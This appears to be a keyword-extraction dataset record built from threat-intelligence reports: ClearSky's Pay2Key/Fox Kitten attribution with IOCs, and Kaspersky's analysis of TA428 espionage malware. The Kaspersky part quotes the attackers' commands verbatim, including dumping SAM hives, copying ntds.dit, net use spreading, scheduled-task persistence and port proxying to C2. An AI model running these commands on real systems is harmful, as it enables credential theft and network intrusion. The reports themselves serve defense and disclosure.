presented a version of the FRPC tool configuration used by this threat actor. The file name was dllhost.dll – same as the files we identified in Pay2Key campaign. Here is the configuration file of the FRPC presented by CISA20:As can be seen, this configuration shares the same token as the Pay2Key FRPC configuration:Note that the FRPC token was entered manually, indicating a single-value token21. Therefore, the overlap between the FRPC token of Fox Kitten and the FRPC token of Pay2Key is strong evidence of the connection between the groups.Since FRP Clients need to connect to an FRP Server, the server token for both Pay2Key and Fox Kitten is the same.19 url 20 url 21 url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White20 | P a g ePay2KittenAnother FRPC’s configuration used that includes this token was uploaded to VT in June 2020. This file also has server_addr parameter, which point to the following IP address, hosted in Amazon cloud22:54.174.216[.]48A comment in VirusTotal23 on this IP with logs of this server point to the aforementioned F5 report by NCC Group. This server was used in attempted exploitation of the F5 vulnerability (CVE-2020-5902):2020-07-06 16:07:55 /tmui/login.jsp/ ;/tmui/locallb/workspace/tmshCmd.jsp curl/7.58.0Also, a similarity of the WebShell was identified. Here is a comparison between the logs and the F5 report by NCC Group24:This exploitation attempt results in the creation of php WebShell with the citrix@kharpedar string.Thus, we identified the same token used by Pay2Key in 2 different FRPC’s configuration, one of which point to a C2 server that attempted to exploit a known vulnerability that Fox Kitten use (which also includes the ‘Kharpedar’ phrase).Command and Control As mentioned before, Fox Kitten used Amazon servers before, the same as Pay2Key. One of the servers we identified in the attack at “Amital”, was attributed by us to Fox Kitten before it was embedded in Pay2Key attack.It is noteworthy to mention that according to the Israel National Cyber Directorate's report, there was a use of a domain called tunnels4[.]me which is on the following IP address: 63.32.140[.]129. On this IP address we have identified an updated domain which is allegedly impersonating 2Bsecure company. However, we do not have a way to associate this information with Fox Kitten's activity, except for the fact that the mentioned control server contains an option to connect with SSH:22 During our initial Fox Kitten analysis, we observed multiple Fox Kitten servers hosted in Amazon. 24 url intelligence/____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White21 | P a g ePay2KittenThematic SimilaritiesWe believe that this attack was conducted by Fox Kitten. We have also identified an old user, named kharpedar that was active in a few sensitive forums and engaged with penetrating sensitive organizational networks. This user is now active under a different name in a few underground forums. In one of these forums, the user has presented its new name with the following message, which makes us believe it is an Iranian attacker.It is noteworthy to mention that other research companies with which we collaborate, also associate this user with Fox Kitten. However, we would like to emphasize that we have no way of determining whether the user was active independently on this forum or on behalf of the Iranian government, selling the data which was obtained by the group. In one of his declarations, he emphasizes that he has accessibility to governmental organizations in Turkey, and in another declaration, he says that India is not an attractive destination for him. In addition, the breach to the holding company Raytheon is another indication (although weak) for the sector on which the Iranian APT33 group focuses. TimelineHere is a chart summarize the Fox Kitten and the Pay2Key timelines:2020FebruaryJuneJulyAugust September OctoberFox KittenPay2KeyClearSky’s Fox Kitten report Citrix: New vulnerability used by the group Attempts to sell victims’ access in underground forums First attempt to exploit Big IP F5 vulnerability citrix@kharpedar WebShell – first identifier FBI Alert – Big F5 vulnerability is used by the group CISA report about Fox KittenKeyBase account--- --First identified access to a vulnerable server Ransomware compilation Malware execution on ‘Patient Zero’____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White22 | P a g ePay2KittenSwascan public report First wave of attacks in Israel – Leaking information via TOR site Second wave of attacks in Israel Compromising multiple companies (Supply Chain attack) Leaking via Twitter Visual change on leak siteNovemberDecember--____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White23 | P a g ePay2KittenRecommendations and InsightsThis report reveals a strong connection between two groups that were formerly considered to be separate units. In recent months, several reports dealing with tools common to pay2key and Fox Kitten were published. The report shows a direct link between pay2key ransomware attacks which all had Fox Kitten tools used in them. The Attackers• The Iranian offensive establishment has reached the level of knowledge and flexibility which allows it to use “1 Day” vulnerabilities, i.e. development and distribution of malware using publicly revealed vulnerabilities, in a period of hours to days since their publication.• We assess that Pay2Key, or Fox Kitten, understands that a direct attack on defense systems is much more difficult than infiltration using VPN systems that bring you directly to the target’s core systems, and that this method is also much more cost effective.• The ransom demand is low compared to other known ransomware gangs; this is an incentive to pay the cheap ransom. The ransom is most likely just a bonus, since the group’s main motivation so far is espionage.• We suspect that not all Fox Kitten targets were encrypted with ransomware, in some data was only exfiltrated. We assess that one of the options is the ransomware was applied to targets that are not the focus of Fox Kitten, while the main targets were left unencrypted in order to keep the attack covert.• We also suspect that the adversary engages in RDP brute force attacks as well as SQL injections on ASP systems. This is because they run on Microsoft Windows systems, which is the only operating system in which the attacker has been observed doing a lateral movement across the organization.The Attack Infrastructure• VPN systems which allow remote access to corporate systems comprise a significant risk, because they essentially bypass all defense systems deployed vis-à-vis the internet. Review and assessment are needed in order to understand whether the systems are controlled and monitored completely by the organization.• The adversary has used the password “kharpedar” in the web shells and in the local windows accounts they created for persistence and lateral movement. It means that the attacker first gained initial foothold access and then escalating privileges and moving latterly across the organization to get to the AD. Monitoring local users and privileges in the organization is essential for identifying unwanted users within the network.• The attackers have used AWS EC2 infrastructure to carry their attacks, it is strongly advised to audit all incoming connections from AWS EC2 to your organization to make sure all the____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White24 | P a g ePay2Kittenaddresses are known to you, as one of those possible addresses might be in use by the adversary.• The recommended timeframe to install a security patch after the vulnerability has been published has shortened and we assess it to be between 24 hours and a week between the vulnerability’s publication and the moment it becomes a real threat for the organization. This can be seen in the F5 exploitation attempts in the NCC report.• Checking outward facing systems, including different VPN systems, is critically important for the company. There is a need for constant monitoring, making sure that the systems are constantly updated, and preventing unneeded exposure of the administration interfaces to the outside world. Constantly check for security updates to VPN systems.• After each update performed on core corporate systems, including VPN systems, it is recommended to reset all passwords to all end users in the organization and to oblige all users to re-connect to the services, in order to identify unwanted connections.••It is highly recommended to create a two-step authentication to the corporate core systems VPN access.It is recommended to use VPN services that keep logs on a different media (preferably non- erasable) during communication.• Users permission’s and active users on each station should be monitored constantly. In this campaign, the attackers have created, multiple times, local users that allowed them to act freely.•If your organization possesses one of the affected software it is highly recommended to perform a full reset of the AD forest as described here under “Comprehensive Account Resets” section.• The attack infrastructure attached to this report should be monitored and blocked.Recommended sources:url© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White25 | P a g ePay2KittenIndicators of CompromiseHashesHashFile NameTypeVirus Total Executablefrps.exeIsraelsvchost.exeIsraelDllhost.dllUK- zero (Fox Kitten)Text – FRPC configuration (Fox Kitten)Text – FRPC C2 Compromised AddressesFile NameTypeVirus Total Significant Submitterdc.plUSA - Zero ExecutableThe following domains were successfully accessed by the attack group to be used as malware download websites:IP AddressASN and ISP52.90.144[.]40AS 14618 ( Amazon.com, Inc. )3.237.39[.]7254.174.216[.]4863.32.140[.]12913.81.213[.]207 Domainstunnels4[.]me2bsecure[.]techAS 14618 ( Amazon.com, Inc. ) AS 14618 ( Amazon.com, Inc. ) AS 16509 ( Amazon.com, Inc. )AS 8075 ( Microsoft Corporation )____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White27 | P a g ePay2KittenClearSky Cyber Security Intelligence Report2020 (C)All rights reserved to ClearSky Security Ltd.TLP: WHITE - Subject to standard copyright rules, information may be distributed freely, without restriction.Photo by Miguel Á. Padriñán from Pexels____________________________________________________________________________________________________© All rights reserved to ClearSky Cyber Security ltd. 2020info@clearskysec.com www.clearskysec.comTLP:White28 | P a g e ","{'phrases': ['the attackers', 'first', 'initial access', 'vulnerabilities', 'VPN', 'Citrix NetScaler', 'Fortinet', 'use', 'tools', 'FRPC', 'Ngrok', 'Reverse Proxy', 'tunnels', 'compromised machines', 'C2', 'servers', 'web shells', 'the victim', 'main', 'AD', 'Kharpedar123', 'lateral movement', 'remote access', 'RDP', 'data', 'ransomware', 'pay2key', 'files', 'TOR', 'payments', 'victims'], 'target': 'the attackers; first; initial access; vulnerabilities; VPN; Citrix NetScaler; Fortinet; use; tools; FRPC; Ngrok; Reverse Proxy; tunnels; compromised machines; C2; servers; web shells; the victim; main; AD; Kharpedar123; lateral movement; remote access; RDP; data; ransomware; pay2key; files; TOR; payments; victims.'}"
The attackers; phishing emails; malicious code; the CVE-2017-11882 vulnerability; an attacker; the malware; PortDoor; lateral movement; privileges; the domain controller; access; TA428; Chinese; servers; DLL hijacking; the CnC servers; data; the archive; encrypted ZIP archives; the archive; DLL Side-Loading; DNSep; lateral movement; the network; IP addresses; the malware; system information; the infected system; additional functionality; the infrastructure; tools; the attackers; the attackers; credentials; TA428; operations; 10; security solutions; 11; The attacks.,[' 1. Phishing emails with weaponized Office documents are sent to deliver the initial PortDoor malware. 2. PortDoor and multiple backdoors like nccTrojan are installed on compromised systems. 3. The Ladon framework is used for network scanning and credential theft. 4. Additional systems are compromised and domain controllers accessed to steal hashes. 5. Data is exfiltrated from the network to command and control servers. 6. Infrastructure analysis points to a Chinese threat actor likely being behind the attacks. '],"Extract the keywords: Targeted attack on industrial enterprises and public institutions08.08.2022Version 1.0Executive summary 2Technical details 3Initial infection 3Malware implants 5PortDoor 5nccTrojan 9Cotx and DNSep 12Logtu 14CotSam 16Lateral movement 18Collecting information on the enterprise’s infrastructure 18Malware distribution 19Domain hijacking 20Infrastructure and data exfiltration 22Victims 23About the attackers 24Conclusions 25Recommendations 26Appendix I – indicators of compromise 28In January 2022, Kaspersky ICS CERT experts detected a wave of targeted attacks on military industrial complex enterprises and public institutions in several Eastern European countries and Afghanistan. In the course of our research, we were able to identify over a dozen of attacked organizations.The attackers were able to penetrate dozens of enterprises and even hijack the IT infrastructure of some, taking control of systems used to manage security solutions.information obtained during our An analysis of cyberespionage was the goal of this series of attacks.investigationindicates thatTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS1 © 2022 AO KASPERSKY LABExecutive summaryThe attackers penetrate the enterprise network using carefully crafted phishing emails, some of which contain information that is specific to the organization under attackand is not publicly available. This could indicate that the attackers did preparatory work in advance (they may have obtained the information in earlier attacks on the same organization or its employees or on other organizations or individuals associated with the victim organization).Microsoft Word documents attached to the phishing emails contain malicious code that exploits the CVE-2017-11882 vulnerability. The vulnerability enables an attacker to execute arbitrary code (in the attacks analyzed, the main module of the PortDoor malware) without any additional user activity.An earlier series of attacks in which the PortDoor malware was also used was described by Cybereason experts.In the new series of attacks, the attackers used six different backdoors at the same time – probably to set up redundant communication channels with infected systems in case one of the malicious programs was detected and removed by a security solution. The backdoors used provide extensive functionality for controlling infected systems and collecting confidential data.The Ladon hacking utility is used as the main lateral movement tool. It combines network scanning, vulnerability search and exploitation, password attack, and other functionality. The attackers also extensively use standard utilities that are part of the Microsoft Windows operating system.The attack’s final stage involves hijacking the domain controller and gaining complete control of all of the organization’s workstations and servers. After gaining domain administrator privileges, the attackers search for and exfiltrate documents and other files that contain the attacked organization’s sensitive data to their servers hosted in different countries. These servers are also used as CnC servers.The attackers compressed stolen files into encrypted and password-protected ZIP archives. After receiving the data collected, the CnC servers forwarded the archives received to a stage two server located in China.The attackers used DLL hijacking and process hollowing techniques extensively in the attack to prevent security software from detecting the malware.Our analysis of information obtained during the investigation suggests that it is highly probable that a Chinese-speaking group is behind the attacks.TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS2 © 2022 AO KASPERSKY LABOur researchers identified malware and CnC servers that have earlier been used in attacks attributed by other researchers to TA428, a Chinese-speaking APT group.We believe that the series of attacks that we have identified is highly likely to be an extension of a known campaign described in Cybereason, DrWeb, and NTTSecurity research and has been attributed with a high degree of confidence to APT TA428 activity.The full article is available on Kaspersky Threat Intelligence.For more information please contact: ics-cert@kaspersky.com.Technical detailsInitial infectionIn January 2022, Kaspersky ICS CERT experts uncovered a new wave of targeted attacks on military-industrial complex enterprises and public institutions in several countries of Eastern Europe and Afghanistan.The attackers penetrated the enterprise network using carefully crafted phishing emails. In the course of our investigation, we discovered that, in some cases, the attackers create phishing emails using information that is not publicly available, such as the full names of employees responsible for handling sensitive information, as well as internal codenames of projects developed by attacked organizations.Phishing emails contain Microsoft Word documents with embedded malicious code that exploits the CVE-2017-11882 vulnerability. The text in such documents is crafted using specific details on the organization’s operation, some of which may not be publicly available.An analysis of document metadata has shown that, with a high degree of likelihood, the attackers stole the document (while it was still legitimate) from another military industrial complex enterprise, after which they modified it using a weaponizer, a program designed to inject malicious code into documents.TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS3 © 2022 AO KASPERSKY LABFragment contentsThe document provides rationale for research and development work related to developing a new product that is to be conducted by the attacked enterprise as the primary contractor.The CVE-2017-11882 vulnerability exists in outdated versions of the Microsoft Equation Editor (a Microsoft Office component). It enables an attacker to use a specially crafted byte sequence masked as an equation, which, when processed, will result in arbitrary code being executed on behalf of the user.However, a malicious document can still be visually detected by noticing an unusual equation object:Equation object (underlined)The vulnerability enables the malware to gain control of an infected system without any additional user activity. For example, there is no need for the user to enable macros, which is required by most attacks.TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS4 © 2022 AO KASPERSKY LABThe malicious code embedded in the document drops PortDoor malware. According to the Cybereason blog post, the malware has earlier been used by the TA428 APT.The PortDoor executable is first extracted to the %AppData%\Local\Temp directory with the name 8.t, after which it is moved to the Microsoft Word startup directory, %AppData%\Roaming\Microsoft\Word\STARTUP, with a name that is specific to each attack, such as strsrv.wll. The malware is installed as a Microsoft Word add-in, enabling the attackers to get a foothold and gain remote control of the infected system.After launching, the malware collects general information about the infected system, such as computer name, IP addresses, etc., and sends the information collected to the CnC server. In cases where profiling results show that the system is of interest to the attackers, they use the backdoor functionality in PortDoor to control the system remotely and deploy additional malware.Initial infection of a systemMalware implantsThe attackers deploy several backdoors at the same time on those systems that are of interest to them. In all likelihood, they use the tactic to create redundant channels of communication with an infected system, e.g., in case one of the malicious programs is removed by a security solution.PortDoorAlthough the functionality of PortDoor was described in the Cybereason blog post, we present the findings of our research to show in what ways the new version of the malware is different from the older version.TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS5 © 2022 AO KASPERSKY LABAfter launching, the malware decrypts the part of its executable file that contains configuration information:Configuration information CnC server are establishedChecksum used to activate payload executionVictim ID sent by the malware to the CnC serverFile for storing the malware installation IDAES key used to encrypt data sent between the malware and the CnC serverTable 1. Descriptions of malware configuration information fieldsAfter decrypting the configuration information, the malware checks that it is not running in a debugger. It also checks whether a file with the name specified in the configuration information, such as 78936077.tmp, exists in the temporary file directory.If the file does not exist, it is created by the malware and a value equal to the product of a pseudorandom number and the time that has passed since system startup is written to it. If the file exists, the malware reads the value written to it earlier.PortDoor uses the above algorithm to create a unique infected system ID, which is sent to the attackers every time PortDoor connects to the CnC server. The IDTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS6 © 2022 AO KASPERSKY LABis needed because infected systems in the same organization can have the same victim ID and external IP address (because they are behind NAT).Next, the malware establishes a connection with a CnC server using the address and port specified in the configuration information. Data sent to the CnC server, as well as data received in response, is encrypted using AES with a key that is also taken from the configuration information.After receiving a response from the CnC server, the malware checks that it contains a special string. In the malware sample discussed here, the string has the value “Kr*^j4”. The malware starts dynamically importing Windows API functions by hashes and subsequently executing the payload only if the strings match. It cannot be said for certain why the attackers implemented this logic in PortDoor. One possible answer is that this may be a way to check the compatibility of the Trojan’s versions with the CnC server.As mentioned above, PortDoor dynamically imports Windows API functions by hashes. The technique eliminates the need for the threat actor to include strings with the names of imported functions in its code to reduce the chances of the malware being detected. The malware first loads the necessary libraries into memory, after which PortDoor reads a loaded library’s export table and calculates the checksum of each exported function’s name until it finds a match with a hash value hard-coded into the malware:Fragment function namesWhen it has completed searching for and importing the necessary functions, the malware enters a loop, waiting for commands from its CnC server.TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS7 © 2022 AO KASPERSKY LABThe PortDoor version identified in the new series of attacks supports the following functions:CommandcodeDescription1812161740414243454849656667Check whether control value “Kr*^j4” is present and send the relevant response to CnC server (probably a version check)Collect information on the infected system: Windows ANSI code page, original equipment manufacturer (OEM) code page, user name, computer name, operating system version, CPU information and victim identifier (e.g., A1-45)Write the data sent to the file specified, adding the string “exit\n” at the end of the file (used by the attackers to create CMD and PowerShell scripts remotely)Hidden remote shell (launches cmd.exe with the CREATE_NO_WINDOW attribute), sends the output to the CnC serverWrite the data sent to the file specified, adding line feed (\n) at the end of the fileAppend the data sent to the end of the file specifiedWrite the data sent to a previously opened fileClose a previously opened fileRead the file specifiedClose a file opened earlierCollect information on processes running in the systemTerminate the process specifiedCollect information on the media (hard drives and USB devices) connected to the system: media type, device characteristics, and free spaceList files by mask in the directory specifiedRemove the file specifiedTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS8 © 2022 AO KASPERSKY LAB6869nccTrojanMove the file specifiedLaunch the process specified in hidden mode (launch with the CREATE_NO_WINDOW attribute)Table 2. List of commands supported by PortDoorIn the course of our investigation, we also identified the nccTrojan malware on many infected systems. The malware has earlier been used in attacks attributed by NTTSecurity experts to the TA428 APT group. In the series of attacks described by the researchers, the attackers used the first version of nccTrojan, as well as versions 2 and 2.1. In January 2022, we identified a new, improved version of nccTrojan – 2.45, as evidenced by the path to the .pdb file and the configuration information of the malware.The installation of nccTrojan is performed by downloading files from the PortDoor CnC server. The executable file (DLL library) of nccTrojan is downloaded as a .cab archive with an arbitrary name, e.g., wam.dll.cab. To unpack it, the attackers use the expand system utility. The file is unpacked into an existing directory used by legitimate software, e.g., %ProgramData%\Intel\ShaderCache, %Program Files%\Common Files\AV\Norton Security Ultra, %ProgramData%\2GIS, %ProgramData%\Adobe, etc.The attackers also download a special installer component to the infected system. It registers the DLL of nccTrojan as a service, ensuring that the malware is loaded automatically at system startup. Curiously, nccTrojan version 2.45 is bundled with an installer that is apparently inherited from a previous version (2.43), as evidenced by the path to the .pdb file.TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS9 © 2022 AO KASPERSKY LABAlgorithm of nccTrojan installerInstallation of nccTrojan malwareAfter launching, the main nccTrojan module connects to CnC servers and waits for a command that should be executed. The malware attempts to connect to all CnC servers hard-coded into the executable file. All subsequent communication is carried out with the server that was the first to respond.When connecting to the CnC server, the malware sends general information about the infected system to the attackers, including computer name, user name, local IP address, system localization information, malware version, etc. ‘TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS10 © 2022 AO KASPERSKY LABArray with data on an infected system collected by nccTrojanLike PortDoor, nccTrojan has backdoor functionality. Thus, the attackers get two channels for controlling the infected system at the same time. In addition, nccTrojan has functionality that uploads information collected by the attackers to the CnC server. Among other things, it is used to steal files containing confidential information. A complete list of commands supported by nccTrojan version 2.45 is provided below:Commandcode0, 1, 2345681012DescriptionLaunch command line (Unicode encoding) and send operating system version to CnC serverExecute command in command line (Unicode encoding)Execute command in command line (ASCII encoding)Collect information about connected media (hard-drives and USB devices)Send a list of files in the directory specifiedLaunch the executable file specifiedRemove the file or folder specifiedUpload selected files from the infected system to the CnC server15, 17Download files to infected system from the CnC server1921232629Send a list of processes running on the systemKill processCopy specified fileMove specified fileLaunch remote command line (ASCII encoding)Table 3. List of commands supported by nccTrojanTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS11 © 2022 AO KASPERSKY LABCotx and DNSepSimilarly to nccTrojan, the attackers download backdoors known as Cotx and DNSep in .cab archives to computers being infected at the lateral movement stage. The malware was described in a Dr.Web research paper, so here we only provide a few clarifications and updates relevant to the series of attacks that we are describing.The two malicious programs have identical functionality and differ only in some parts of the code.After delivering and unpacking Cotx/DNSep, the attackers use the DLL hijacking technique in outdated and vulnerable versions of McAfee SecurityCenter, the Sophos SafeStore Restore tool, and Intel Common User Interface. The malicious library that is loaded and executed using the DLL hijacking technique decrypts the backdoor’s executable file, which is located in a file with the extension .log.Cotx executable files are encrypted using the AES256 algorithm. They are decrypted using a key hard-coded into the malicious library:Fragment codeTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS12 © 2022 AO KASPERSKY LABDNSep executable files are unpacked using the RtlDecompressBuffer function.After being decrypted, the backdoor is loaded into a legitimate process’s memory using the process hollowing technique and connects to the CnC server. In the case of Cotx, malicious code is injected into the dllhost.exe process and in the case of DNSep, it is injected into the process of powercfg.exe, a power management utility.A list of commands supported by the Cotx and DNSep backdoors is provided below:CommandcodeDescription12346789101113Set bot IDLaunch command lineExecute command in previously launched command lineCollect information on connected data media (hard-drives and USB devices)Upload file from infected system to CnC serverCopy fileRemove fileGet file sizeMove fileSet time interval for requests to CnC serverRemove malwareTable 4. List of commands supported by Cotx and DNSepThe variant of Cotx that we have identified is very similar to the variant analyzed earlier by Dr.Web and is most likely to be its updated version.TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS13 © 2022 AO KASPERSKY LABComparison of Cotx self-removal function from the new attack series (left)and the sample analyzed by Dr.Web (right)The Logtu malware has also been observed in attacks attributed to TA428. The new version of Logtu uses dynamic imports and XOR encrypted function names to evade detection:LogtuDecrypting functionTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS14 © 2022 AO KASPERSKY LABLogtu is downloaded, deployed and launched in the same way as Cotx and DNSep, with the following exception: instead of using the process hollowing technique with a system process, it is used with a legitimate software process into which a malicious library has been loaded.A list of commands supported by Logtu is shown below:CommandcodeDescription123456789101112Send time since system startup (calculated using GetTickCount function)Launch command-line interpreter, redirecting input and output to named pipeWrite data to the file specifiedRemove the file specifiedThe command accepts an argument divided into two parts with the | character, e.g., <a>|<b>. The command checks whether file <a> exists – if the file exists, <b>|<file size> is sent to the server; if the file does not exist –<b>|01 is sent to the server, after which the file <a>.tut is created and the character “0” is written to it 32 timesAugment the file specified (e.g., <a>) with data received from the malware CnC server. If the relevant parameter is specified, the malware removes the file <a> and renames the file <a>.tu to <a>.Send file creation date and time for the file specifiedRead 4kb from the file specified at the offset specified and send to the CnC serverCollect information on file systems used on the infected machineSend dirlist for the directory specified (list of files with sizes, time modified, and file attributes)Remove the file specifiedMove the file specifiedTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS15 © 2022 AO KASPERSKY LAB13141516171819Launch program (create process)Make screenshotSend a list of services registered in the system (service name, status, and display name)Launch the service specifiedSend a list of running processesTerminate the process specifiedClose the connection with the CnC serverTable 5. List of commands supported by LogtuIn addition to all the malware described above, in the course of our research we came across a new backdoor that is different from all others used in attacks attributed by researchers to TA428. Due to its similarity with the Cotx backdoor, we decided to name the malware Backdoor.Win32.CotSam.In the process of developing the attack, the attackers have used two methods of deploying the malware at the same time.In the first case, the attackers delivered a vulnerable version of Microsoft Word together with the malware. Microsoft Word 2007 was used for 32-bit systems and Microsoft Word 2010 for 64-bit systems. DLL hijacking vulnerability was exploited after loading WINWORD.EXE, resulting in control being passed to the malicious library named wwlib.dll, which decrypts the file OEMPRINT.CAT from the current directory by performing a simple xor operation with the key 0xAA:CotSamDecrypting the CotSam malware moduleNext, the WriteProcessMemory function is used to write the decrypted executable file directly to the memory of the svchost.exe process.TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS16 © 2022 AO KASPERSKY LABIn the second case, the attackers exploited DLL hijacking vulnerability in the applaunch.exe application (MD5: 170D73BE3FE846E9070CFAE530F5A31C). It is worth noting that the same version of applaunch.exe had previously been used by other Chinese groups to distribute ShadowPad malware.After launching, the backdoor extracts the proxy server’s parameters from the HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer registry key and connects to the CnC server, waiting for commands.CommandcodeDescription0x268447744 Get information on the infected system’s architecture usingthe GetNativeSystemInfo function0x268443648 Collect information on data media connected (hard-drivesand USB devices)0x268443649 Get a list of files in the directory specified0x268443650 Read the file specified0x268443651Set the specified event object to the signaled state0x268443654 Create a file at the path specified0x268443655, 0x268451842Write the data received from CnC to the file specified0x268443656Remove the file specified0x268443657Launch the file specified (create process)0x268443658 Check whether a file or a directory exists0x268464128Send a data buffer to the malware CnC server, with data encrypted using XOR with the key 480x268447745Terminate the process specified0x268472320Launch the command line interpreterTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS17 © 2022 AO KASPERSKY LAB0x268472324Set high integrity control for the process (S-1-16-12288)0x268464129 Write the data received from CnC to the setting.cfgconfiguration fileTable 6. List of commands supported by CotSamLateral movementAfter gaining a foothold on the initial system, the attackers attempt to spread the malware to other computers on the enterprise network. At this stage, the attackers’ goal is to gain access to the domain controller and take full control of the attacked organization’s infrastructure.To launch their utilities and get the results of their operation, the attackers use a remote shell provided by backdoor malware. In the course of our research, we identified a series of commands executed on infected systems that the attackers entered by hand (this is indicated both by the time intervals between commands and by the output of results not being redirected anywhere except standard output).Collecting information on the enterprise’s infrastructureThe attackers mostly scanned the network using the NBTscan console utility, which was delivered to victim computers as a .cab archive named ace.cab and unpacked using the expand system utility:expand.exe ace.cab ace.exe The framework consists of numerous modules with diverse lateral movement functionality, including:• Scanning the network and finding different types of devices. • Identifying and exploiting vulnerabilities in the devices found. • Cracking passwords for resources on the network. • Searching for password hashes. • Searching for passwords in text files. • Remotely executing arbitrary code.TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS18 © 2022 AO KASPERSKY LABFragment of Ladon codeThese tools enable an attacker to scan the entire infrastructure that is available over the network and identify the most vulnerable computers on the network.The attackers also collected information on users working on the system and their network connections. Specifically, they were interested in RDP connections:query user netstat -no | findstr 3389 netstat -ano | findstr 2589Malware distributionThe attackers were able to move laterally by infecting one system after another, gaining access to these systems using network scanning results and user credentials stolen earlier. They used the net use and xcopy utilities to establish network connections with remote systems and copy malware to those systems:net use \\[IP address]\IPC$ ""[password]"" /u:""[user name]"" xcopy.exe /s \\[IP address]\c$\windows\web\*"" $windir\Web\ /y /e /i /qTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS19 © 2022 AO KASPERSKY LABIn some cases, malware was launched using an open-source VBS script named wmic.vbs, which the attackers also downloaded to remote systems:cscript.exe //nologo wmic.vbs /cmd [IP address] [user name][password] $appdata\ABBYY\Install.exeThe VBS script was originally developed as a penetration testing tool, but threat actors often use it in real-world attacks. The script, wmic.vbs, executes commands on behalf of a user account with administrative privileges using WMIC (Windows Management Instrumentation Command-line).In other cases, the attackers created a task in Windows Task Scheduler to ensure that the malware started automatically:schtasks /create /tn CacheTasks /tr “$appdata\ABBYY\FineReader\WINWORD.EXE” /sc minute /mo 50 /ru “” /fIn cases where the attackers were able to reach closed networks (i.e., networks that are not directly connected to the internet), they turned intermediate systems (systems available from closed networks and at the same time connected to the internet) into proxy servers. This enabled malware running on systems that were part of closed networks to communicate with its CnC servers. Setting up network traffic redirection in this case was a trivial task that was also performed using standard Windows tools:netsh interface portproxy add v4tov4 2589 <IP address> 443Domain hijackingAfter gaining access to the domain controller, the attackers stole the entire database of Active Directory user password hashes. To do this, they first saved a copy of system registry hives with a special cmd command:reg save HKLM\SAM sam.save reg save HKLM\SECURITY security.saveNext, they copied the file ntds.dit, which contains the Active Directory database, including user password hashes. Curiously, the file ntds.dit is continuously used by the system and cannot be copied using standard tools. To get around this restriction, the attackers used a special utility designed to copy the file using the Windows volume shadow copy service (VSS).TARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS20 © 2022 AO KASPERSKY LABUtility designed to copy files using VSSAn example of a command launching the utility is shown below:c:\programdata\microsoft\sc64.exe c:\windows\ntds\ntds.dit c:\programdata\microsoft\ntds.ditUsing the contents of the system registry and the file ntds.dit, the attackers were able to get logins and password hashes for all users of the domain. Next, the attackers used hash cracking to gain authentication credentials for most users from the attacked organization’s domain.In cases where an attacked organization’s IT infrastructure includes several domains, the attackers analyzed trust relationships between the domains to identify accounts allowing them to move laterally:nltest /domain_trustsIn the process of attacking a domain controller, the attackers obtained, among others, the password hash of the user krbtgt (Active Directory service account), enabling them to conduct an attack known as Golden Ticket. It allowed them to issue Kerberos tickets (TGT) independently and authenticate on any Active Directory service – all of this for an unlimited time.In one of the cases analyzed, the attacked organization’s security team was able to identify suspicious activity on the domain controller, after which the passwords of those users whose accounts had been compromised wereTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS21 © 2022 AO KASPERSKY LABchanged. However, the attackers continued to act on behalf of these accounts without any problems using Kerberos tickets. This shows that in the case of a Golden Ticket attack, standard incident response methods are inadequate.Finally, it is worth noting that in one of the cases the attackers were also able to gain access to the server hosting the system that controls security solutions and to remotely modify the settings of endpoint security solutions used by the organization.Infrastructure and data exfiltrationAs part of a joint research project, we were granted access to the contents of several CnC servers hosted in the infrastructure of a hosting service provider. This provided us with additional threat actor activity information.After gaining control of a major part of the attacked organization’s IT infrastructure, the attackers moved on to the stage of stealing sensitive information. All files collected by the attackers were packed into password- protected ZIP archives. To automate the process, the attackers used their own build of the 7-Zip utility.Code fragment from the 7-Zip build used in the attackIt is worth emphasizing that the attackers created their archives in such a way that the names of the files in the archive, as well as their contents, were encrypted. In some cases, this approach may enable them to evade DLP solutions when sending sensitive data beyond the organization’s perimeter.The archives created were sent to one of the stage one malware CnC servers, which are located in different countries of the world. In most cases, stage oneTARGETED ATTACK ON INDUSTRIAL ENTERPRISES AND PUBLIC INSTITUTIONS22 © 2022 AO KASPERSKY 